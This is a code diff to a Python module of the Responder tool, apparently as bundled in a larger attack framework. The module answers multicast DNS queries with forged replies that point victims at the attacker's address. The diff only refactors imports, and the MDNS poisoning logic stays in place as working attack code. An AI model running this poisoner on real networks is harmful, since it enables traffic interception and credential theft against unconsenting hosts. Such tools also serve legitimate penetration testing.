@@ -18,7 +18,8 @@ import struct
 
 from SocketServer import BaseRequestHandler
 from core.responder.packets import MDNS_Ans
-from core.responder.utils import *
+from core.responder import utils
+from core.responder import responder_settings
 
 def Parse_MDNS_Name(data):
 	try:
@@ -46,18 +47,18 @@ class MDNS(BaseRequestHandler):
 		Request_Name = Parse_MDNS_Name(data)
 
 		# Break out if we don't want to respond to this host
-		if (not Request_Name) or (RespondToThisHost(self.client_address[0], Request_Name) is not True):
+		if (not Request_Name) or (utils.RespondToThisHost(self.client_address[0], Request_Name) is not True):
 			return None
 
-		if settings.Config.AnalyzeMode:  # Analyze Mode
-			if Parse_IPV6_Addr(data):
-				print text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3), color(Request_Name, 3)))
+		if responder_settings.Config.AnalyzeMode:  # Analyze Mode
+			if utils.Parse_IPV6_Addr(data):
+				print utils.text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (utils.color(self.client_address[0], 3), utils.color(Request_Name, 3)))
 		else:  # Poisoning Mode
-			if Parse_IPV6_Addr(data):
+			if utils.Parse_IPV6_Addr(data):
 
 				Poisoned_Name = Poisoned_MDNS_Name(data)
-				Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Bind_To))
+				Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(responder_settings.Config.Bind_To))
 				Buffer.calculate()
 				soc.sendto(str(Buffer), (MADDR, MPORT))
 
-				print color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)
+				print utils.color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)
